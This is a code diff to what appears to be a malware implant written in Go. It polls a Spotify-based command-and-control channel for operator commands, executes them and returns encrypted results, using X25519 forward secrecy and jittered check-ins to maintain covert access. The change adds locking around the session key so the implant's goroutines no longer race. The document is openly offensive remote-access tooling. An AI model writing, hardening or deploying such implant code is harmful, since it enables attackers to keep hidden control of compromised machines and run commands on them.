@@ -25,17 +25,17 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client         *spotify.Client
-	key            string
-	interval       int
-	jitter         int
-	processedSeqs  map[int]bool
-	checkinPending bool
-	readFails      int // consecutive READ failures (polling)
-	writeFails     int // consecutive WRITE failures (checkin/results)
-	sessionID      string
-	clientID       string
-	lastCheckin    time.Time // when last checkin was sent
+	client          *spotify.Client
+	key             string
+	interval        int
+	jitter          int
+	processedSeqs   map[int]bool
+	checkinPending  bool
+	readFails       int // consecutive READ failures (polling)
+	writeFails      int // consecutive WRITE failures (checkin/results)
+	sessionID       string
+	clientID        string
+	lastCheckin     time.Time     // when last checkin was sent
 	checkinInterval time.Duration // how often to re-send heartbeat checkins
 
 	// Async result delivery
@@ -43,9 +43,12 @@ type Implant struct {
 	seqMu    sync.Mutex
 	wg       sync.WaitGroup
 
-	// Forward secrecy via X25519
+	// Forward secrecy via X25519. sessionKey is written by the poll
+	// goroutine (key exchange, shutdown reset) and read by the result
+	// writer goroutine — guarded by skMu.
 	ephPriv    *ecdh.PrivateKey
 	ephPub     *ecdh.PublicKey
+	skMu       sync.RWMutex
 	sessionKey []byte // derived ECDH session key (nil until key exchange)
 }
 
@@ -130,13 +133,19 @@ func getClientID(encryptionKey string) string {
 	return hex.EncodeToString(h.Sum(nil))[:16]
 }
 
-// currentKey returns the session key (hex-encoded) if forward secrecy
-// has been established, or falls back to the master key.
-func (imp *Implant) currentKey() string {
-	if imp.sessionKey != nil {
-		return hex.EncodeToString(imp.sessionKey)
-	}
-	return imp.key
+// getSessionKey returns a copy of the current ECDH session key,
+// or nil if forward secrecy has not been established.
+func (imp *Implant) getSessionKey() []byte {
+	imp.skMu.RLock()
+	defer imp.skMu.RUnlock()
+	return imp.sessionKey
+}
+
+// setSessionKey updates the ECDH session key (nil to reset).
+func (imp *Implant) setSessionKey(key []byte) {
+	imp.skMu.Lock()
+	defer imp.skMu.Unlock()
+	imp.sessionKey = key
 }
 
 // sendCheckin sends a check-in beacon so the operator knows we connected.
@@ -412,8 +421,8 @@ func (imp *Implant) pollAndExecute() {
 		// Try decryption: session key first, then master key
 		var cmdDict map[string]interface{}
 		var decErr error
-		if imp.sessionKey != nil {
-			cmdDict, decErr = protocol.DecodeMessageRaw(payload, imp.sessionKey)
+		if sk := imp.getSessionKey(); sk != nil {
+			cmdDict, decErr = protocol.DecodeMessageRaw(payload, sk)
 		}
 		if cmdDict == nil {
 			cmdDict, decErr = protocol.DecodeMessage(payload, imp.key)
@@ -452,7 +461,7 @@ func (imp *Implant) pollAndExecute() {
 				time.Now().Format("15:04:05"))
 			fmt.Println("\033[33m[!] Waiting for operator to reconnect...\033[0m")
 			// Reset forward secrecy (new operator will have different X25519 keys)
-			imp.sessionKey = nil
+			imp.setSessionKey(nil)
 			// Force immediate re-checkin so new operator sees us
 			imp.checkinPending = true
 			imp.lastCheckin = time.Time{}
@@ -534,7 +543,7 @@ func (imp *Implant) handleKeyExchange(msg *protocol.C2Message) {
 		return
 	}
 
-	imp.sessionKey = sessionKey
+	imp.setSessionKey(sessionKey)
 	fmt.Printf("\033[32m[+] Forward secrecy established\033[0m at %s\n",
 		time.Now().Format("15:04:05"))
 }
@@ -565,8 +574,8 @@ func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) 
 	// Use session key for encoding if forward secrecy is established
 	var encoded string
 	var err error
-	if imp.sessionKey != nil {
-		encoded, err = protocol.EncodeMessageRaw(result.ToResultMap(), imp.sessionKey)
+	if sk := imp.getSessionKey(); sk != nil {
+		encoded, err = protocol.EncodeMessageRaw(result.ToResultMap(), sk)
 	} else {
 		encoded, err = protocol.EncodeMessage(result.ToResultMap(), imp.key)
 	}
